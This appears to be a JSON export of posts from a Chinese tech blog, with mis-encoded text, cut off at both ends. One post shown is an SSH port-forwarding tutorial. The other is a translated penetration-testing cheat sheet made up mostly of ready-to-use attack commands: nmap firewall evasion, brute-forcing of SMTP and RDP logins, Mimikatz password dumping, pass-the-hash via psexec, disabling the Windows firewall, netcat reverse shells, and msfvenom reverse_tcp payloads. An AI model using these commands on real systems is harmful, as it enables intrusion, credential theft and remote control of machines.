/root/Your_database.sql;","raw":null,"content":null,"categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://kionf.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://kionf.com/tags/Mysql/"}]},{"title":"SSHç«¯å£è½¬å‘","slug":"linux-ssh","date":"2017-01-08T16:00:00.000Z","updated":"2018-10-31T10:19:28.303Z","comments":true,"path":"2017/01/09/linux-ssh/","link":"","permalink":"https://kionf.com/2017/01/09/linux-ssh/","excerpt":"é€šè¿‡æœ¬æ–‡çš„ä»‹ç»ï¼Œè¯»è€…å¯ä»¥ä»ä¸­äº†è§£åˆ°å¦‚ä½•åº”ç”¨ SSH ç«¯å£è½¬å‘æœºåˆ¶æ¥è§£å†³æ—¥å¸¸å·¥ä½œ / ç”Ÿæ´»ä¸­çš„ä¸€äº›é—®é¢˜ã€‚å­¦ä¼šåœ¨éå®‰å…¨ç¯å¢ƒä¸‹ä½¿ç”¨ç«¯å£è½¬å‘æ¥åŠ å¯†ç½‘ç»œåº”ç”¨ï¼Œä¿æŠ¤ä¸ªäººéšç§ä»¥åŠé‡è¦å•†ä¸šä¿¡æ¯ã€‚åŒæ—¶ä¹Ÿèƒ½å¤Ÿç”¨æ­¤æŠ€æœ¯è§£å†³å·¥ä½œä¸­ä¸€äº›å¸¸è§é—®é¢˜ï¼Œä¾‹å¦‚è§£å†³é˜²ç«å¢™åŠç½‘ç»œåº”ç”¨æœ¬èº«å¸¦æ¥çš„ä¸€äº›é™åˆ¶ã€‚\n","text":"é€šè¿‡æœ¬æ–‡çš„ä»‹ç»ï¼Œè¯»è€…å¯ä»¥ä»ä¸­äº†è§£åˆ°å¦‚ä½•åº”ç”¨ SSH ç«¯å£è½¬å‘æœºåˆ¶æ¥è§£å†³æ—¥å¸¸å·¥ä½œ / ç”Ÿæ´»ä¸­çš„ä¸€äº›é—®é¢˜ã€‚å­¦ä¼šåœ¨éå®‰å…¨ç¯å¢ƒä¸‹ä½¿ç”¨ç«¯å£è½¬å‘æ¥åŠ å¯†ç½‘ç»œåº”ç”¨ï¼Œä¿æŠ¤ä¸ªäººéšç§ä»¥åŠé‡è¦å•†ä¸šä¿¡æ¯ã€‚åŒæ—¶ä¹Ÿèƒ½å¤Ÿç”¨æ­¤æŠ€æœ¯è§£å†³å·¥ä½œä¸­ä¸€äº›å¸¸è§é—®é¢˜ï¼Œä¾‹å¦‚è§£å†³é˜²ç«å¢™åŠç½‘ç»œåº”ç”¨æœ¬èº«å¸¦æ¥çš„ä¸€äº›é™åˆ¶ã€‚ 0x01 ç«¯å£è½¬å‘æ¦‚è¿°SSH ä¼šè‡ªåŠ¨åŠ å¯†å’Œè§£å¯†æ‰€æœ‰ SSH å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´çš„ç½‘ç»œæ•°æ®ã€‚ä½†æ˜¯ï¼ŒSSH è¿˜åŒæ—¶æä¾›äº†ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„åŠŸèƒ½ï¼Œè¿™å°±æ˜¯ç«¯å£è½¬å‘ã€‚å®ƒèƒ½å¤Ÿå°†å…¶ä»– TCP ç«¯å£çš„ç½‘ç»œæ•°æ®é€šè¿‡ SSH é“¾æ¥æ¥è½¬å‘ï¼Œå¹¶ä¸”è‡ªåŠ¨æä¾›äº†ç›¸åº”çš„åŠ å¯†åŠè§£å¯†æœåŠ¡ã€‚è¿™ä¸€è¿‡ç¨‹æœ‰æ—¶ä¹Ÿè¢«å«åšéš§é“ï¼ˆtunnelingï¼‰ï¼Œè¿™æ˜¯å› ä¸º SSH ä¸ºå…¶ä»– TCP é“¾æ¥æä¾›äº†ä¸€ä¸ªå®‰å…¨çš„é€šé“æ¥è¿›è¡Œä¼ è¾“è€Œå¾—åã€‚ ä¾‹å¦‚ï¼ŒTelnetï¼ŒSMTPï¼ŒLDAP è¿™äº› TCP åº”ç”¨å‡èƒ½å¤Ÿä»ä¸­å¾—ç›Šï¼Œé¿å…äº†ç”¨æˆ·åï¼Œå¯†ç ä»¥åŠéšç§ä¿¡æ¯çš„æ˜æ–‡ä¼ è¾“ã€‚è€Œä¸æ­¤åŒæ—¶ï¼Œå¦‚æœæ‚¨å·¥ä½œç¯å¢ƒä¸­çš„é˜²ç«å¢™é™åˆ¶äº†ä¸€äº›ç½‘ç»œç«¯å£çš„ä½¿ç”¨ï¼Œä½†æ˜¯å…è®¸ SSH çš„è¿æ¥ï¼Œé‚£ä¹ˆä¹Ÿæ˜¯èƒ½å¤Ÿé€šè¿‡å°† TCP ç«¯å£è½¬å‘æ¥ä½¿ç”¨ SSH è¿›è¡Œé€šè®¯ã€‚ æ€»çš„æ¥è¯´ SSH ç«¯å£è½¬å‘èƒ½å¤Ÿæä¾›ä¸¤å¤§åŠŸèƒ½ï¼š åŠ å¯† SSH Client ç«¯è‡³ SSH Server ç«¯ä¹‹é—´çš„é€šè®¯æ•°æ®ã€‚ çªç ´é˜²ç«å¢™çš„é™åˆ¶å®Œæˆä¸€äº›ä¹‹å‰æ— æ³•å»ºç«‹çš„ TCP è¿æ¥ã€‚ 0x02 æœ¬åœ°è½¬å‘ å¦‚å›¾,æˆ‘ä»¬å¯¹Bæœºå™¨æ²¡æœ‰æ“ä½œæƒé™ï¼ŒCæœºå™¨æ¬²è®¿é—®Bæœºå™¨ï¼Œä½†ç”±äºBæœºå™¨æ— å¤–ç½‘ipï¼Œæ‰€ä»¥æ— æ³•è®¿é—®ï¼Œä½†Aæœºå™¨å¯ä»¥å’ŒBï¼ŒCä¸¤å°æœºå™¨é€šä¿¡ï¼ˆæœ‰å¤–ç½‘ipå’Œå†…ç½‘ipï¼‰ï¼Œæ­¤æ—¶ä½¿ç”¨SSHåœ¨Aæœºå™¨ä¸ŠåšSSHç«¯å£æœ¬åœ°è½¬å‘ï¼Œæ¥å®ç°å¤–ç½‘è®¿é—®å†…ç½‘Bæœºå™¨ å¦‚æœè½¬å‘åç›‘å¬çš„ipåœ°å€ä¸º0.0.0.0ï¼Œåˆ™éœ€è¦æ›´æ”¹è·³æ¿æœºçš„sshdé…ç½®æ–‡ä»¶vim /etc/ssh/sshd_configæ›´æ”¹GatewayPorts no &gt; GatewayPorts yes åœ¨Aæœºå™¨æ‰§è¡Œï¼š 123ssh -CfNgL 0.0.0.0:80:172.16.1.2:80 root@172.16.1.3 | | | | | A B C D E è¿™é‡Œæˆ‘ä»¬æ¥åˆ†æ®µè®²è§£å‘½ä»¤çš„æ„æˆï¼š Aï¼š è¿™é‡Œæ˜¯æœ¬æœºè½¬å‘åè¦ç›‘å¬çš„ipæ®µï¼Œ0.0.0.0å…è®¸æ‰€æœ‰ipè®¿é—®ï¼Œæœ¬æœºipå…è®¸å†…ç½‘ipè®¿é—®ï¼Œ127.0.0.1å…è®¸æœ¬æœºè®¿é—®Bï¼šè¿œç¨‹ä¸»æœºç«¯å£è½¬å‘åˆ°æœ¬æœºåçš„ç«¯å£Cï¼šè¦è½¬å‘çš„è¿œç¨‹ä¸»æœºipï¼Œè¿™é‡Œçš„ipåœ°å€æ˜¯ç›¸å¯¹è·³æ¿æœºè€Œè¨€çš„Dï¼šè¦è½¬å‘çš„ç«¯å£Eï¼šéœ€è¦æ‰§è¡Œè½¬å‘çš„æœºå™¨ï¼Œå³è·³æ¿æœº 1234567-C å‹ç¼©ä¼ è¾“æ•°æ®-f å»ºç«‹SSHè¿æ¥åæ”¾ç½®åå°ï¼Œé™é»˜æ¨¡å¼-N ä¸è¦æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚ è¿™å¯¹äºä»…è½¬å‘ç«¯å£å¾ˆæœ‰ç”¨ï¼ˆä»…é™åè®®ç‰ˆæœ¬2ï¼‰-g å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç«¯å£è½¬å‘-L æŒ‡å®šæœ¬åœ°ï¼ˆå®¢æˆ·ç«¯ï¼‰ä¸»æœºä¸Šçš„ç»™å®šç«¯å£è¦è½¬å‘åˆ°è¿œç¨‹ç«¯çš„ç»™å®šä¸»æœºå’Œç«¯å£ã€‚è¿™é€šè¿‡åˆ†é…ä¸€ä¸ªå¥—æ¥å­—ä¾¦å¬æœ¬åœ°ç«¯å£ï¼Œ å¯é€‰ç»‘å®šåˆ°æŒ‡å®šçš„bind_addresså·¥ä½œã€‚æ¯å½“ä¸æ­¤ç«¯å£å»ºç«‹è¿æ¥æ—¶ï¼Œéƒ½ä¼šé€šè¿‡å®‰å…¨é€šé“è½¬å‘è¿æ¥ï¼Œ å¹¶ä»è¿œç¨‹æœºå™¨è¿æ¥åˆ°ä¸»æœºç«¯å£ä¸»æœºç«¯å£ # è®°ä½æœ¬åœ°è½¬å‘æ—¶å€™ç”¨Lé€‰é¡¹å°±å¯ä»¥äº† è®¿é—®æµç¨‹å¦‚ä¸‹ï¼š 1Client(C) è®¿é—®TCP&gt; A:80 é€šè¿‡SSHéš§é“&gt; SSH(A) TCP&gt; B:80 è¿™é‡Œåšçš„æ˜¯åœ¨Aä¸»æœºæœ¬åœ°çš„ç«¯å£è½¬å‘ï¼Œå¦‚æœæƒ³æŠŠBæœºå™¨80ç«¯å£è½¬å‘åˆ°åœ¨Cæœºå™¨çš„80ç«¯å£ åœ¨Cæœºå™¨æ‰§è¡Œï¼š 12345#ssh -CfNgL 0.0.0.0:80:172.16.1.2:80 root@172.16.1.3ssh -CfNgL 0.0.0.0:80:172.16.1.2:80 root@123.56.1.23 åªéœ€è¦æŠŠæ­¤ipï¼Œæ›´æ¢æˆAæœºå™¨å¤–ç½‘ipå³å¯#sshç™»é™†Aä¸»æœºï¼Œå‘Šè¯‰Aä¸»æœºï¼Œè½¬å‘Bä¸»æœºï¼ˆ172.16.1.2ï¼‰80ç«¯å£ï¼Œæœ¬æœºSSHä¸Aä¸»æœºå»ºç«‹SSHéš§é“è½¬å‘åˆ°æœ¬æœº80ç«¯å£#æ­¤æ—¶åœ¨Aä¸»æœºæ‰§è¡Œnetstat -anp|grep sshä¼šå¤šå‡ºæ¥ä¸€æ¡SSHéš§é“è¿›ç¨‹ï¼Œè¿™ä¸ªéš§é“å°±æ˜¯ä¸Cä¸»æœºå»ºç«‹çš„ è®¿é—®æµç¨‹å¦‚ä¸‹ï¼š 1Client(C) TCP&gt; C:80 é€šè¿‡SSHéš§é“&gt; SSH(A) TCP&gt; B:80 å»ºè®®äº²æ‰‹æ“ä½œå»è¯•è¯•æ‰¾ä¸‹æ„Ÿè§‰ï¼ 0x03 è¿œç¨‹è½¬å‘ å¦‚å›¾ï¼ŒåŒæ ·æˆ‘ä»¬å¯¹Cæœºå™¨æ²¡æœ‰æ“ä½œæƒé™ï¼ŒDæœºå™¨æƒ³è®¿é—®Cæœºå™¨80ç«¯å£ï¼Œä½†æ˜¯å’ŒCåŒä¸€ç½‘æ®µçš„æœºå™¨éƒ½æ²¡æœ‰å¤–ç½‘ipï¼Œåªæœ‰Aæœºå™¨æœ‰å¤–ç½‘ä½†å’ŒCåˆä¸æ˜¯ä¸€ä¸ªå±€åŸŸç½‘ï¼Œä¸ŠèŠ‚æˆ‘ä»¬ç”¨çš„æœ¬åœ°ç«¯å£è½¬å‘åœ¨è¿™é‡Œå°±ä¸èƒ½ä½¿ç”¨äº†ï¼Œæ­¤æ—¶è¿œç¨‹ç«¯å£è½¬å‘å‡ºæ¥äº†: ) åœ¨Bæœºå™¨æ‰§è¡Œï¼š 12345 éœ€è¦è½¬å‘ä¸»æœºçš„ip(C) |ssh -CNfgR 0.0.0.0:80:172.16.1.2:80 root@123.56.2.3 | | | |è¿œç¨‹ä¸»æœºç›‘å¬ç½‘æ®µ è¿œç¨‹ä¸»æœºç›‘å¬ç«¯å£ è½¬å‘ç«¯å£ è¿œç¨‹ä¸»æœº(A) æ‰§è¡Œå¦‚ä¸Šæ“ä½œï¼Œæ­¤æ—¶Dè®¿é—®Aä¸»æœº80ç«¯å£å°±å¯ä»¥è½¬å‘åˆ°Cä¸»æœº80ç«¯å£Bä¸»æœºæ‰®æ¼”è·³æ¿æœºè§’è‰² è®¿é—®æµç¨‹å¦‚ä¸‹ï¼š 12Client(D) TCP&gt; A:80 SSHéš§é“&gt; B TCP&gt; C:80#æœ‰ç§å–é˜Ÿå‹çš„æ„Ÿè§‰ï¼šï¼‰ 0x04 åŠ¨æ€ç«¯å£è½¬å‘æ­¤æ–¹æ³•å¤šç”¨äºç¿»å¢™ï¼Œæ‰€æœ‰ç«¯å£ç»è¿‡SSHéš§é“ï¼Œå»ºç«‹socksè¿æ¥ï¼Œä¸€æ¡å‘½ä»¤è‡ªå·±ä½“ä¼š 1ssh -qTfnN -D 7070 servername@serverIP -p sshport","raw":null,"content":null,"categories":[{"name":"SSH","slug":"SSH","permalink":"https://kionf.com/categories/SSH/"}],"tags":[{"name":"Foward","slug":"Foward","permalink":"https://kionf.com/tags/Foward/"},{"name":"SSH","slug":"SSH","permalink":"https://kionf.com/tags/SSH/"}]},{"title":"æ¸—é€å·¥å…·å®æˆ˜åº”ç”¨å‘½ä»¤åˆé›†","slug":"kali-tools","date":"2016-12-29T16:00:00.000Z","updated":"2018-10-31T10:19:28.295Z","comments":true,"path":"2016/12/30/kali-tools/","link":"","permalink":"https://kionf.com/2016/12/30/kali-tools/","excerpt":"æœ¬æ–‡ä¸ºå›½å¤–å¤§ç‰›æ€»ç»“è‡ªå·±åœ¨æ¸—é€æµ‹è¯•ä¸­å¸¸ç”¨çš„ä¸€äº›å°æŠ€å·§ã€‚åŸæ–‡åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œè¿™é‡Œç¿»è¯‘å¹¶ä¸”æ€»ç»“ï¼Œæ–¹ä¾¿æŸ¥é˜…ã€‚\n","text":"æœ¬æ–‡ä¸ºå›½å¤–å¤§ç‰›æ€»ç»“è‡ªå·±åœ¨æ¸—é€æµ‹è¯•ä¸­å¸¸ç”¨çš„ä¸€äº›å°æŠ€å·§ã€‚åŸæ–‡åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œè¿™é‡Œç¿»è¯‘å¹¶ä¸”æ€»ç»“ï¼Œæ–¹ä¾¿æŸ¥é˜…ã€‚ NMAP æ‰«æç­–ç•¥12345678910111213141516171819202122232425262728# é€‚ç”¨æ‰€æœ‰å¤§å°ç½‘ç»œæœ€å¥½çš„ nmap æ‰«æç­–ç•¥# ä¸»æœºå‘ç°ï¼Œç”Ÿæˆå­˜æ´»ä¸»æœºåˆ—è¡¨$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24$ grep &quot;Status: Up&quot; Discovery.gnmap | cut -f 2 -d &apos; &apos; &gt; LiveHosts.txt# ç«¯å£å‘ç°ï¼Œå‘ç°å¤§éƒ¨åˆ†å¸¸ç”¨ç«¯å£# http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt# ç«¯å£å‘ç°ï¼Œå‘ç°å…¨éƒ¨ç«¯å£ï¼Œä½† UDP ç«¯å£çš„æ‰«æä¼šéå¸¸æ…¢$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt# æ˜¾ç¤º TCP\\UDP ç«¯å£$ grep &quot;open&quot; FullTCP|cut -f 1 -d &apos; &apos; | sort -nu | cut -f 1 -d &apos;/&apos; |xargs | sed &apos;s/ /,/g&apos;|awk &apos;&#123;print &quot;T:&quot;$0&#125;&apos;$ grep &quot;open&quot; FullUDP|cut -f 1 -d &apos; &apos; | sort -nu | cut -f 1 -d &apos;/&apos; |xargs | sed &apos;s/ /,/g&apos;|awk &apos;&#123;print &quot;U:&quot;$0&#125;&apos;# ä¾¦æµ‹æœåŠ¡ç‰ˆæœ¬$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt# æ‰«åšç³»ç»Ÿæ‰«æ$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt# ç³»ç»Ÿå’ŒæœåŠ¡æ£€æµ‹$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt Nmap â€“ èº²é¿é˜²ç«å¢™1234567891011121314151617181920212223# åˆ†æ®µ$ nmap -f# ä¿®æ”¹é»˜è®¤ MTU å¤§å°ï¼Œä½†å¿…é¡»ä¸º 8 çš„å€æ•°(8,16,24,32 ç­‰ç­‰)$ nmap --mtu 24# ç”Ÿæˆéšæœºæ•°é‡çš„æ¬ºéª—$ nmap -D RND:10 [target]# æ‰‹åŠ¨æŒ‡å®šæ¬ºéª—ä½¿ç”¨çš„ IP$ nmap -D decoy1,decoy2,decoy3 etc.# åƒµå°¸ç½‘ç»œæ‰«æ, é¦–å…ˆéœ€è¦æ‰¾åˆ°åƒµå°¸ç½‘ç»œçš„IP$ nmap -sI [Zombie IP] [Target IP]# æŒ‡å®šæºç«¯å£å·$ nmap --source-port 80 IP# åœ¨æ¯ä¸ªæ‰«ææ•°æ®åŒ…åè¿½åŠ éšæœºæ•°é‡çš„æ•°æ®$ nmap --data-length 25 IP# MAC åœ°å€æ¬ºéª—ï¼Œå¯ä»¥ç”Ÿæˆä¸åŒä¸»æœºçš„ MAC åœ°å€$ nmap --spoof-mac Dell/Apple/3Com IP Nmap è¿›è¡Œ Web æ¼æ´æ‰«æ12345678cd /usr/share/nmap/scripts/wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gznmap -sS -sV --script=vulscan/vulscan.nse targetnmap -sS -sV --script=vulscan/vulscan.nse â€“script-args vulscandb=scipvuldb.csv targetnmap -sS -sV --script=vulscan/vulscan.nse â€“script-args vulscandb=scipvuldb.csv -p80 targetnmap -PN -sS -sV --script=vulscan â€“script-args vulscancorrelation=1 -p80 targetnmap -sV --script=vuln targetnmap -PN -sS -sV --script=all â€“script-args vulscancorrelation=1 target ä½¿ç”¨ DIRB çˆ†ç ´ç›®å½•DIRB æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºçˆ†ç ´ç›®å½•çš„å·¥å…·ï¼Œåœ¨ Kali ä¸­é»˜è®¤å·²ç»å®‰è£… 1dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt Patator â€“ å…¨èƒ½æš´åŠ›ç ´è§£æµ‹è¯•å·¥å…·1234567# git clone https://github.com/lanjelot/patator.git /usr/share/patator# SMTP çˆ†ç ´$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst$ patator smtp_login host=192.168.17.129 helo=&apos;ehlo 192.168.17.128&apos; user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=&apos;incorrect password or account name&apos; ä½¿ç”¨ Fierce çˆ†ç ´ DNS æ³¨ï¼šFierce ä¼šæ£€æŸ¥ DNS æœåŠ¡å™¨æ˜¯å¦å…è®¸åŒºåŸŸä¼ é€ã€‚å¦‚æœå…è®¸ï¼Œå°±ä¼šè¿›è¡ŒåŒºåŸŸä¼ é€å¹¶é€šçŸ¥ç”¨æˆ·ï¼Œå¦‚æœä¸å…è®¸ï¼Œåˆ™å¯ä»¥é€šè¿‡æŸ¥è¯¢ DNS æœåŠ¡å™¨æšä¸¾ä¸»æœºåã€‚ç±»ä¼¼å·¥å…·ï¼šsubDomainsBrute å’Œ SubBrute ç­‰ç­‰ 123# http://ha.ckers.org/fierce/$ ./fierce.pl -dns example.com$ ./fierce.pl â€“dns example.com â€“wordlist myWordList.txt ä½¿ç”¨ Nikto æ‰«æ Web æœåŠ¡1nikto -C all -h http://IP æ‰«æ WordPress12git clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan./wpscan â€“url http://IP/ â€“enumerate p HTTP æŒ‡çº¹è¯†åˆ«12345wget http://www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zipcd httprint_301/linux/./httprint -h http://IP -s signatures.txtä½¿ç”¨ Skipfish æ‰«ææ³¨ï¼šSkipfish æ˜¯ä¸€æ¬¾ Web åº”ç”¨å®‰å…¨ä¾¦æŸ¥å·¥å…·ï¼ŒSkipfish ä¼šåˆ©ç”¨é€’å½’çˆ¬è™«å’ŒåŸºäºå­—å…¸çš„æ¢é’ˆç”Ÿæˆä¸€å¹…äº¤äº’å¼ç½‘ç«™åœ°å›¾ï¼Œæœ€ç»ˆç”Ÿæˆçš„åœ°å›¾ä¼šåœ¨é€šè¿‡å®‰å…¨æ£€æŸ¥åè¾“å‡ºã€‚ 1skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP ä½¿ç”¨ NC æ‰«æ12345nc -v -w 1 target -z 1-1000for i in &#123;101..102&#125;; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done#åˆ¤æ–­ç«¯å£æ˜¯å¦å¼€å¯nc -v5 -w target port Unicornscan æ³¨ï¼šUnicornscan æ˜¯ä¸€ä¸ªä¿¡æ¯æ”¶é›†å’Œå®‰å…¨å®¡è®¡çš„å·¥å…·ã€‚ 123456us -H -msf -Iv 192.168.56.101 -p 1-65535us -H -mU -Iv 192.168.56.101 -p 1-65535-H åœ¨ç”ŸæˆæŠ¥å‘Šé˜¶æ®µè§£æä¸»æœºå-m æ‰«æç±»å‹ (sf - tcp, U - udp)-Iv - è¯¦ç»† ä½¿ç”¨ Xprobe2 è¯†åˆ«æ“ä½œç³»ç»ŸæŒ‡çº¹1xprobe2 -v -p tcp:80:open IP æšä¸¾ Samba1234nmblookup -A targetsmbclient //MOUNT/share -I target -Nrpcclient -U &quot;&quot; targetenum4linux target æšä¸¾ SNMP123snmpget -v 1 -c public IPsnmpwalk -v 1 -c public IPsnmpbulkwalk -v2c -c public -Cn0 -Cr10 IP PuTTY è¿æ¥éš§é“12è½¬å‘è¿œç¨‹ç«¯å£åˆ°ç›®æ ‡åœ°å€plink.exe -P 22 -l root -pw &quot;1234&quot; -R 445:127.0.0.1:445 IP Meterpreter ç«¯å£è½¬å‘123# è½¬å‘è¿œç¨‹ç«¯å£åˆ°ç›®æ ‡åœ°å€meterpreter &gt; portfwd add â€“l 3389 â€“p 3389 â€“r 172.16.194.141kali &gt; rdesktop 127.0.0.1:3389 SSH ç©¿é€123ssh -D 127.0.0.1:1080 -p 22 user@IPAdd socks4 127.0.0.1 1080 in /etc/proxychains.confproxychains commands target SSH ç©¿é€ä»ä¸€ä¸ªç½‘ç»œåˆ°å¦ä¸€ä¸ªç½‘ç»œ12345ssh -D 127.0.0.1:1080 -p 22 user1@IP1Add socks4 127.0.0.1 1080 in /etc/proxychains.confproxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2Add socks4 127.0.0.1 1081 in /etc/proxychains.confproxychains commands target ä½¿ç”¨ metasploit è¿›è¡Œç©¿é€123456789101112131415161718route add X.X.X.X 255.255.255.0 1use auxiliary/server/socks4arunproxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP Eæˆ–è€…meterpreter &gt; ipconfigIP Address : 10.1.13.3meterpreter &gt; run autoroute -s 10.1.13.0/24meterpreter &gt; run autoroute -p10.1.13.0 255.255.255.0 Session 1meterpreter &gt; Ctrl+Zmsf auxiliary(tcp) &gt; use exploit/windows/smb/psexecmsf exploit(psexec) &gt; set RHOST 10.1.13.2msf exploit(psexec) &gt; exploitmeterpreter &gt; ipconfigIP Address : 10.1.13.2 å¼€å¯ RDP æœåŠ¡123reg add &quot;hklm\\system\\currentcontrolset\\control\\terminal server&quot; /f /v fDenyTSConnections /t REG_DWORD /d 0netsh firewall set service remoteadmin enablenetsh firewall set service remotedesktop enable å…³é—­ Windows é˜²ç«å¢™1netsh firewall set opmode disable Meterpreter VNC\\RDP12run getgui -u admin -p 1234run vnc -p 5043 ä½¿ç”¨ Mimikatzè·å– Windows æ˜æ–‡ç”¨æˆ·åå¯†ç 12345678910111213141516171819202122git clone https://github.com/gentilkiwi/mimikatz.gitprivilege::debugsekurlsa::logonPasswords fullè·å–å“ˆå¸Œå€¼git clone https://github.com/byt3bl33d3r/pth-toolkitpth-winexe -U hash //IP cmdæˆ–è€…apt-get install freerdp-x11xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IPåœ¨æˆ–è€…meterpreter &gt; run post/windows/gather/hashdumpAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::msf &gt; use exploit/windows/smb/psexecmsf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586cmsf exploit(psexec) &gt; exploitmeterpreter &gt; shell ä½¿ç”¨ Hashcat ç ´è§£å¯†ç 1hashcat -m 400 -a 0 hash /root/rockyou.txt ä½¿ç”¨ NC æŠ“å– Banner ä¿¡æ¯12345nc 192.168.0.10 80GET / HTTP/1.1Host: 192.168.0.10User-Agent: Mozilla/4.0Referrer: www.example.com æŸ¥æ‰¾ SUID\\SGID root æ–‡ä»¶1234567891011121314151617# æŸ¥æ‰¾ SUID root æ–‡ä»¶find / -user root -perm -4000 -print# æŸ¥æ‰¾ SGID root æ–‡ä»¶:find / -group root -perm -2000 -print# æŸ¥æ‰¾ SUID å’Œ SGID æ–‡ä»¶:find / -perm -4000 -o -perm -2000 -print# æŸ¥æ‰¾ä¸å±äºä»»ä½•ç”¨æˆ·çš„æ–‡ä»¶:find / -nouser -print# æŸ¥æ‰¾ä¸å±äºä»»ä½•ç”¨æˆ·ç»„çš„æ–‡ä»¶:find / -nogroup -print# æŸ¥æ‰¾è½¯è¿æ¥åŠå…¶æŒ‡å‘:find / -type l -ls è·å–è¿›ç¨‹å¯¹åº”çš„ PID12fuser -nv tcp 80fuser -k -n tcp 80 ä½¿ç”¨ Hydra çˆ†ç ´ RDP1hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp æŒ‚è½½è¿œç¨‹ Windows å…±äº«æ–‡ä»¶å¤¹1smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw Kali ä¸‹ç¼–è¯‘ Exploit12gcc -m32 -o output32 hello.c (32 ä½)gcc -m64 -o output hello.c (64 ä½) Kali ä¸‹ç¼–è¯‘ Windows Exploit12345678wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/downloadwine mingw-get-setup.exeselect mingw32-basecd /root/.wine/drive_c/windowswget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zipcd /root/.wine/drive_c/MinGW/binwine gcc -o ability.exe /tmp/exploit.c -lwsock32wine ability.exe NASM å‘½ä»¤ NASM å…¨ç§° The Netwide Assemblerï¼Œæ˜¯ä¸€æ¬¾åŸºäº80Ã—86å’Œx86-64å¹³å°çš„æ±‡ç¼–è¯­è¨€ç¼–è¯‘ç¨‹åºï¼Œå…¶è®¾è®¡åˆè¡·æ˜¯ä¸ºäº†å®ç°ç¼–è¯‘å™¨ç¨‹åºè·¨å¹³å°å’Œæ¨¡å—åŒ–çš„ç‰¹æ€§ã€‚ 12nasm -f bin -o payload.bin payload.asmnasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload åŸºäº CSV æ–‡ä»¶æŸ¥è¯¢ Exploit-DB1234567git clone https://github.com/offensive-security/exploit-database.gitcd exploit-database./searchsploit â€“u./searchsploit apache 2.2./searchsploit &quot;Linux Kernel&quot;cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep &quot;&lt;|&lt;=&quot; | sort -k3 shellä½¿ç”¨ NC åœ¨ Windows ä¸Šåå¼¹ shell12345678c:&gt;nc -Lp 31337 -vv -e cmd.exenc 192.168.0.10 31337c:&gt;nc example.com 80 -e cmd.exenc -lp 80nc -lp 31337 -e /bin/bashnc 192.168.0.10 31337nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000 Python shell1python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos; Python\\Ruby\\PHP HTTP æœåŠ¡å™¨123456python2 -m SimpleHTTPServerpython3 -m http.serverruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 8888, :D ocumentRoot =&gt; Dir.pwd).start&quot;php -S 0.0.0.0:8888 1234msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &gt; system.exemsfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &gt; exploit.phpmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 --platform win -f asp -o file.aspmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b &quot;\\x00&quot; -a x86 --platform win -f c MSF ç”Ÿæˆåœ¨ Linux ä¸‹åå¼¹çš„ Meterpreter Shell1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 --platform linux -o shell MSF ç”Ÿæˆåå¼¹ Shell (C Shellcode)1msfvenom -p windows/shell_reverse_tcp 